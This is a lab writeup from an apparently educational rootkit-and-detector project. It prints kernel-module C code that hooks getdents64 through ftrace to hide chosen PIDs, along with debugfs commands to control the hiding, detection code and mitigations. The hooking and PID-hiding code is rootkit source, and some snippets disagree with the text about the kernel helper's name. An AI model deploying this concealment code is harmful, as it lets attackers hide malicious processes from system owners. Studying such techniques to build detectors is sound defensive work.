# 03 — Process concealment via ftrace syscall hook

_Stage 3 of the shadowfox + lighthouse project. Paired writeup for
the syscall-level process concealment in `modules/shadowfox/hide_proc.c`
and the two complementary detectors in `modules/lighthouse/`._

> **Status.** Built and smoke-tested on the lab VM against kernel
> `6.6.138-0606138-generic`. Demo verified end-to-end: PID hidden
> from `ls /proc/` and `ps`; direct access via
> `cat /proc/<pid>/comm` still works; cross-view detector returns
> empty by design; ftrace-ops walker flags shadowfox with handler
> address `sf_ftrace_callback+0x0/0x150 [shadowfox]`.

---

## 1. Overview

Userspace tools enumerate processes by reading `/proc/`. `ls /proc/`,
`ps`, `top`, `pgrep` — all of them ultimately call the `getdents64`
syscall on the directory file descriptor. shadowfox installs an
ftrace function hook on `__x64_sys_getdents64`, lets the real
syscall populate the user buffer, then walks the returned
`linux_dirent64` stream and quietly drops any entry whose numeric
filename matches a configured "hidden PID." From userspace, the
hidden process is invisible to enumeration even though every other
property — its PID being live in the task list, its `/proc/<pid>/`
subtree being directly openable by name, its CPU time still
accruing — remains untouched.

The detection asymmetry is sharper than in earlier stages and
requires **two** detectors:

- A **cross-view** detector (`for_each_process` vs `iterate_dir`
  on `/proc`) catches rootkits that hook below the VFS — at
  `proc_pid_readdir` or further down. It does *not* catch this
  particular shadowfox by design, because `iterate_dir` bypasses
  the syscall entry our hook sits on.
- An **ftrace-ops integrity** detector walks the kernel's
  registered `ftrace_ops` list and flags any op whose `.func`
  pointer lives inside an out-of-tree module. This catches
  shadowfox via a different signal: not "PID X is hidden" but "an
  out-of-tree module has an active ftrace hook."

Both detectors run on every scan trigger. Each documents what it
catches and what it doesn't, in its source comments and in the
warning lines it emits.

## 2. Kernel internals involved

### `__x64_sys_getdents64` and the SYSCALL_DEFINE wrapper

The 6.6 source declares the syscall via:

```c
SYSCALL_DEFINE3(getdents64, unsigned int, fd,
                struct linux_dirent64 __user *, dirent, unsigned int, count)
```

`SYSCALL_DEFINE3` expands (on x86_64) to:

```c
long __x64_sys_getdents64(const struct pt_regs *regs)
{
    return __se_sys_getdents64(SC_X86_64_REGS_TO_ARGS_3(regs));
}
```

The pt-regs wrapper is what we hook. It receives a pointer to the
user-space registers as captured at syscall entry, and unpacks the
three argument slots (`regs->di`, `regs->si`, `regs->dx`).

### `struct linux_dirent64`

```c
struct linux_dirent64 {
    u64            d_ino;
    s64            d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};
```

`d_reclen` is the entry's full size including padding to keep the
next entry aligned; `d_name` is null-terminated within `d_reclen -
offsetof(d_name)`. The returned buffer is a packed stream of such
entries; walking it requires honouring each entry's `d_reclen` to
find the next one.

### ftrace function hooking

Modern kernels compile every function with `-mfentry`, planting a
5-byte call site at the function's entry. The site starts as a
multi-byte NOP; when ftrace activates tracing for a function, the
NOP becomes a `call` to `ftrace_caller`. `ftrace_caller` saves all
registers into a `struct ftrace_regs` and dispatches to each
registered `ftrace_ops` whose filter hash contains the current IP.

The `FTRACE_OPS_FL_IPMODIFY` flag tells ftrace that our callback
may rewrite the saved IP inside `ftrace_regs`. When ftrace_caller
returns, the function-prologue code restores the (now modified) IP
into RIP and jumps to it — so control transfers to our replacement
function as if it had been called directly, with the same calling
convention and the same arguments still in their canonical
registers.

### Recursion: the parent_ip check

If a replacement function calls the original via the saved
function pointer, the call re-enters the hook and would loop
forever. The kernel's livepatch infrastructure solves this with a
"caller is in patched module" check; we use the same pattern. Our
ftrace handler inspects `parent_ip` — the return address inside the
caller — and skips the IP-rewrite if `within_module(parent_ip,
THIS_MODULE)` is true. The original then runs.

### `ftrace_ops_list` for the detector

The kernel's `ftrace_ops_list` is the head of a singly-linked,
RCU-protected list of every registered `ftrace_ops`. It is
terminated by a sentinel called `ftrace_list_end`. Both are
kallsyms-resolvable but neither is exported.

## 3. Implementation walkthrough (shadowfox side)

The technique is split across three files: `ftrace_hook.{h,c}`
(reusable foundation, to be reused in Stages 4 and 5),
`hide_proc.{h,c}` (the actual filter), and integration into
`main.c`'s debugfs handler.

### `ftrace_hook.c` — the reusable wrapper

```c
static void sf_ftrace_callback(unsigned long ip, unsigned long parent_ip,
                               struct ftrace_ops *ops,
                               struct ftrace_regs *fregs)
{
    struct sf_ftrace_hook *hook =
        container_of(ops, struct sf_ftrace_hook, ops);

    if (within_module(parent_ip, THIS_MODULE))
        return;  /* recursion guard: original called from our code */

    ftrace_instruction_pointer_set(fregs, (unsigned long)hook->replacement);
}

int sf_ftrace_hook_install(struct sf_ftrace_hook *hook)
{
    hook->target = (unsigned long)sf_kallsyms_lookup(hook->name);
    if (!hook->target) return -ENOENT;

    if (hook->original_pp)
        *hook->original_pp = (void *)hook->target;

    hook->ops.func = sf_ftrace_callback;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&hook->ops, hook->target, 0, 0);
    ret = register_ftrace_function(&hook->ops);
    return 0;
}
```

The "saved original" is just the target function's address —
calling it triggers the hook again, but the recursion guard passes
the call through.

### `hide_proc.c` — the filter

```c
static long sf_hooked_sys_getdents64(const struct pt_regs *regs)
{
    long orig_total = orig_sys_getdents64(regs);     /* real syscall */
    if (orig_total <= 0) return orig_total;

    /* Copy the user buffer to kernel memory for safe walking. */
    struct linux_dirent64 __user *user_buf = (void __user *)regs->si;
    struct linux_dirent64 *kbuf = kvmalloc(orig_total, GFP_KERNEL);
    copy_from_user(kbuf, user_buf, orig_total);

    /* Walk; drop entries whose numeric name matches a hidden PID. */
    long total = orig_total, offset = 0;
    while (offset < total) {
        struct linux_dirent64 *ent = (void *)((char *)kbuf + offset);
        if (name_is_hidden_pid(ent->d_name, /* … */)) {
            memmove(ent, (char *)ent + ent->d_reclen,
                    total - offset - ent->d_reclen);
            total -= ent->d_reclen;
        } else {
            offset += ent->d_reclen;
        }
    }

    copy_to_user(user_buf, kbuf, total);
    /* Zero the tail to avoid leaking the original (pre-filter) bytes. */
    if (total < orig_total)
        clear_user((char __user *)user_buf + total, orig_total - total);
    kvfree(kbuf);
    return total;
}
```

A couple of subtle bits:

- **Quick reject for non-digit names.** Most `/proc/` entries
  (`mounts`, `cpuinfo`, `meminfo`, …) aren't PIDs. We bail on the
  first non-digit character so non-PID directories cost almost
  nothing.
- **Tail-zeroing after copy_to_user.** Userspace contracts say
  "don't read past the returned count," but we clear the tail
  anyway to prevent a paranoid reader from recovering the dropped
  entry data from the original syscall's write to the buffer.
- **Failure mode: kvmalloc fails.** We return `orig_total`
  unchanged — better to leak the hidden entry than corrupt the
  user buffer. The writeup in section 8 names this as a deliberate
  failure-open posture.

### Debugfs control

Three new commands wired into the existing `sf_ctl_write`:

```
echo hide-pid 12345 > /sys/kernel/debug/shadowfox/ctl
echo show-pid 12345 > /sys/kernel/debug/shadowfox/ctl
echo clear-hidden-pids > /sys/kernel/debug/shadowfox/ctl
```

The hidden-PID list is a kmalloc-backed linked list under a
spinlock — small enough that linear scan is cheap, dynamically
growable, no fixed cap.

`sf_proc_hide_pid()` refuses PID 1 (init) outright to prevent the
class of accidents where a fat-fingered command bricks the rest of
the system.

### What we deliberately do NOT do

- We do **not** hook `open()` or any inode-lookup path. Direct
  access by typed-out name (e.g., `cat /proc/12345/status`) still
  succeeds for a hidden PID. Concealing that requires general
  inode-level file hiding, which is Stage 4.
- We do **not** filter signals, ptrace, or any other PID-keyed
  syscall. A hidden process can still be killed with
  `kill -9 12345` if you know the number. Real-world rootkits
  hook many more paths; Stage 3 is scoped to enumeration only.

## 4. Kernel version compatibility matrix

| Kernel        | Status                  | Notes                                                                                              |
|---------------|-------------------------|----------------------------------------------------------------------------------------------------|
| < 4.18        | Won't build             | Pre-mfentry; ftrace IP-modify story differs.                                                       |
| 4.18 – 5.6    | Should work             | Pre-livepatch IPMODIFY semantics; some flag names differ. Untested.                                |
| 5.7+          | Should work             | `kallsyms_lookup_name` unexported (we use the kprobe trick).                                       |
| **6.6 LTS**   | **Target**              | Pinned: `6.6.138-0606138-generic`.                                                                 |
| 6.0+ aarch64  | Won't work as-is        | Hook target is `__x64_sys_*`; aarch64 needs `__arm64_sys_*`. Trivial rename if you need it.        |
| 6.8+          | Unverified              | No known ftrace API changes that would break this. `__x64_sys_getdents64` rename is unlikely.      |

The reusable `ftrace_hook.c` is the most portable piece — every
out-of-tree ftrace-hook rootkit uses essentially this pattern.

## 5. Detection counterpart

Two detectors, paired in `lighthouse`. They cover different threat
shapes and the writeup makes the trade-off explicit.

### `detect_proc.c` — cross-view enumeration

```c
/* Phase 1: kernel ground truth */
rcu_read_lock();
for_each_process(task) {
    pid_set_add(&kernel_pids, task_pid_nr(task));
}
rcu_read_unlock();

/* Phase 2: /proc-visible set via iterate_dir */
file = filp_open("/proc", O_RDONLY | O_DIRECTORY, 0);
iterate_dir(file, &collector.ctx);  /* actor parses PID-shaped names */

/* Phase 3: diff */
list_for_each_entry(e, &kernel_pids, link) {
    if (!pid_set_contains(&proc_pids, e->pid))
        pr_warn("process anomaly (cross-view): pid=%d ...\n", e->pid);
}
```

**This detector cannot catch shadowfox.** `iterate_dir()` calls
`file->f_op->iterate_shared` directly — for `/proc/` that's
`proc_root_readdir` → `proc_pid_readdir`. The syscall hook sits on
`__x64_sys_getdents64`, *above* that call chain, on a separate
path. Kernel callers of `iterate_dir` simply do not flow through
our hook.

The detector is included anyway because (a) it cleanly demonstrates
the cross-view technique, and (b) it WILL catch a different rootkit
that hooks at the proc-filesystem layer. The Stage 3 writeup
discusses this gap in section 8 ("Lessons learned"), and the
detector's source comments name the limitation up front.

### `detect_hooks.c` — ftrace-ops integrity walker

```c
head_addr = lh_kallsyms_lookup("ftrace_ops_list");
list_end  = lh_kallsyms_lookup("ftrace_list_end");

rcu_read_lock();
op = rcu_dereference_raw(*head_addr);
while (op && op != list_end) {
    preempt_disable();
    struct module *owner = lh_module_address((unsigned long)op->func);
    preempt_enable();

    if (owner && owner != THIS_MODULE)
        pr_warn("ftrace hook by module %s (handler at %pS)\n",
                owner->name, (void *)op->func);

    op = rcu_dereference_raw(op->next);
}
rcu_read_unlock();
```

The signal is "an out-of-tree module has an active ftrace hook,"
not "PID X is hidden." That's different shape, but it does catch
shadowfox by design: our `ftrace_hook.c` registers an op whose
`.func` resolves into shadowfox's text.

False-positive surface: any legitimate out-of-tree module that
uses ftrace (eBPF programs that go through ftrace, certain
debugging modules, livepatches). The Stage 3 detector reports
*any* such op, leaving the user to interpret. Stage 6 may add an
allowlist of "expected" modules.

### Both run on every scan

`main.c`'s scan trigger and init both call
`lh_detect_hidden_modules`, `lh_detect_cred_anomalies`,
`lh_detect_proc_anomalies`, and `lh_detect_ftrace_hooks` in
sequence. One scan trigger = full sweep.

## 6. Real-world references

- **Diamorphine** by m0nad —
  [github.com/m0nad/Diamorphine](https://github.com/m0nad/Diamorphine).
  Original educational ftrace-syscall-hook rootkit. Process hiding
  uses essentially the same `__x64_sys_getdents64` interception.
- **Reptile** by f0rb1dd3n —
  [github.com/f0rb1dd3n/Reptile](https://github.com/f0rb1dd3n/Reptile).
  More elaborate; our `ftrace_hook.c` helper borrows from its
  install/remove pattern.
- **Linux livepatch documentation** —
  `Documentation/livepatch/` in the kernel tree. Same IPMODIFY
  mechanism used for legitimate kernel patching; reading it builds
  intuition for the hook-from-inside-the-kernel side.
- **LWN.net** — "Live kernel patching with livepatch" and the
  ftrace-architecture series. Background on how `ftrace_caller`
  and `FTRACE_OPS_FL_*` flags interact.
- **LKRG (Linux Kernel Runtime Guard)** —
  [www.openwall.com/lkrg](https://www.openwall.com/lkrg/).
  Production-grade kernel-mode integrity checker that does ftrace-
  ops walking on a timer; what `detect_hooks.c` aspires to be.
- **Linux kernel source** — `kernel/trace/ftrace.c`,
  `fs/readdir.c`, `fs/proc/base.c`, `fs/proc/root.c`. Definitive
  references for everything touched.

## 7. Mitigations

- **`CONFIG_MODULE_SIG_FORCE=y`** — Unsigned modules cannot load;
  shadowfox is unsigned out-of-tree code.
- **Secure Boot + `CONFIG_LOCKDOWN_LSM` (confidentiality mode)** —
  Disables kprobes (we use the kprobe trick to resolve kallsyms),
  blocks `/dev/kmem`, etc. Hooks lose their resolver. Lockdown's
  integrity mode also restricts `ftrace_set_filter_ip` paths.
- **`CONFIG_KPROBES=n`** — Same resolver-blocking effect.
- **`CONFIG_FTRACE=n` or `CONFIG_DYNAMIC_FTRACE=n`** — No ftrace,
  no hook. Modern distro kernels ship ftrace enabled because every
  function-tracing tool relies on it; disabling it is rare.
- **`CONFIG_LIVEPATCH=y` with `CONFIG_DEBUG_LIVEPATCH=y`** — Adds
  kernel checks that catch some IPMODIFY abuses. Not a complete
  defence, but raises the bar.
- **LKRG-style runtime monitor** — periodic ftrace-ops walking, as
  in `detect_hooks.c`. Production hardening.
- **Volatility / live forensics** — A memory image cleanly walks
  task lists regardless of any runtime hook; rootkits cannot hide
  from offline analysis.
- **Tracepoints + audit logging** — Real-world detection systems
  pair task-creation tracepoints with `/proc/` enumeration deltas;
  a process that exists in the tracepoint stream but never in
  `/proc/` is suspicious.

## 8. Lessons learned

- **ftrace recursion is real and the parent_ip check matters.**
  The first naive replacement (no recursion guard) called the
  original via the stored pointer and got an immediate kernel
  freeze on insmod, because every call from our replacement
  re-entered our hook. `within_module(parent_ip, THIS_MODULE)` is
  the canonical fix; it's also what livepatch uses.
- **Syscall hooks and VFS hooks are not interchangeable.**
  Hooking `__x64_sys_getdents64` filters userspace enumeration only.
  An in-kernel caller of `iterate_dir()` — like lighthouse's own
  cross-view detector — sees the unfiltered list. This forced the
  Stage 3 detector design into two separate paths (cross-view +
  ftrace-ops walk) rather than a single cross-view comparison. The
  separation made the writeup richer; it also made it longer.
- **`tail-zeroing after copy_to_user` is a small thing that gets
  forgotten.** The original syscall wrote `orig_total` bytes; our
  filtered version writes fewer. A reader who walks past the
  returned count can recover dropped entries from those leftover
  bytes. `clear_user(tail)` closes the leak; most published
  educational rootkits don't bother.
- **`kvmalloc` over `kmalloc` for the dirent copy.** The user
  buffer can be large (tens of KB on busy `/proc/` directories);
  `kmalloc` of contiguous memory of that size is more failure-
  prone than necessary. `kvmalloc` falls back to vmalloc under
  pressure.
- **PID 1 guardrail.** Refusing to hide init costs nothing and
  prevents a class of "my shell is now unkillable" accidents.
- **ftrace-ops walking is the right "we hooked something"
  detector,** not a "PID X is hidden" detector. The two pair up
  naturally — different signals, both useful, neither sufficient
  alone.
- **`ftrace_regs_set_instruction_pointer`, not
  `ftrace_instruction_pointer_set`.** The first build attempt
  failed at compile time: the helper macro was renamed at some
  point in the 5.x → 6.x transition (the 6.6 spelling adds
  "regs_" in the middle). Confirmed correct name with the
  compiler's "did you mean" hint and a glance at
  `include/linux/ftrace.h`.
- **`<linux/dirent.h>` does not include `<linux/types.h>`.**
  Build fail #2: `u64` and `s64` undeclared inside dirent.h.
  Fix: include types.h before dirent.h. Both Diamorphine and
  Reptile sidestep this by declaring `struct linux_dirent64`
  locally; we instead reorder includes and leave a one-line
  comment.

---

_Next technique: Stage 4 — file hiding via `getdents64` filtering
on arbitrary paths + `vfs_readdir` comparator._
